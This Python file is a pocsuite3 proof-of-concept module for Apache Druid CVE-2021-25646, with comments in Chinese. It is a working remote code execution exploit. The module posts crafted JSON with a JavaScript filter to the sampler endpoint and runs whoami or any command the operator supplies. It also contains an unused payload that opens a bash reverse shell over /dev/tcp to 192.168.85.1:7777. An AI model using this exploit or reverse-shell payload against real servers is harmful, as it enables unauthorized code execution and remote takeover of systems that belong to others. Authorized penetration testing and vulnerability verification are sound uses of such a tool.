#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import threading
import uuid
import subprocess
import os
from urllib.parse import urlparse
from collections import OrderedDict
import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import logger
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger, OptDict
from pocsuite3.api import POC_CATEGORY, VUL_TYPE



class Druid_RCE_POC(POCBase):
    vulID = 'Druid-CVE-2021-25646'
    appName = 'Druid'
    appVersion = 'Apache Druid < 0.20.1'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2021-02-02'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2021-02-02'  # 编写 PoC 的日期
    updateDate = '2021-04-20'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw']  # 漏洞地址来源,0day不用写
    name = 'Druid-RCE'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"


    def _verify(self, p_cmd=''):
        result={}

        # 例：http://cqq.com:8088/axis
        vul_url = self.url

        host, port = url2ip(vul_url, True)

        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 
        target_url = vul_url + '/druid/indexer/v1/sampler'



        headers = {
            "Connection": "close", 
            "Content-Type": "application/json",
        }

        payload_whoami = '''{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"timestamp\\":\\"2020-12-12T12:10:21.040Z\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "test", "function": "function(value) {java.lang.Runtime.getRuntime().exec('whoami')}", "": {"enabled": true}}}}}}
        '''

        payload_rshell = '''{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"timestamp\\":\\"2020-12-12T12:10:21.040Z\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "test", "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.85.1/7777 0>&1')}", "": {"enabled": true}}}}}}
        '''

        resp = None

        try:
            if p_cmd:    # attack模式
                # 这里有{}  没法format
                payload_custom = '''{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"timestamp\\":\\"2020-12-12T12:10:21.040Z\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "test", "function": "function(value) {java.lang.Runtime.getRuntime().exec(' ''' + p_cmd + ''' ')}", "": {"enabled": true}}}}}}
                '''
                resp = req.post(target_url, data=payload_custom, headers=headers, timeout=5)

                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['Command'] = p_cmd
                result['VerifyInfo']['Response'] = resp.text
                return self.save_output(result)
            else:    # 普通verify模式
                resp = req.post(target_url, data=payload_whoami, headers=headers, timeout=5)   #,  proxies={'http': 'http://127.0.0.1:8087'}) #, proxies={'http': 'http://127.0.0.1:8087'})
        except Exception as e:
            raise e
        
        #time.sleep(2) # 休眠2s等待ceye生成记录
        #if self.test_dnslog(self.CEYE_URL):
        if resp.status_code== 200 and "numRowsIndexed" in str(resp.text):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Response'] = resp.text
            return self.save_output(result)
        return self.save_output(result)


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True          



    # 攻击模块
    # 参考：https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/ecshop_rce.py
    def _attack(self):
        cmd = self.get_option("command")
        result = dict()
        result['Stdout'] = self._verify(cmd)
        return self.save_output(result)



    def _options(self):
        o = OrderedDict()
        o["command"] = OptDict(selected="bash")
        return o


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            output.show_result()
        else:
            output.fail()
        return output


# 注册类
register_poc(Druid_RCE_POC)
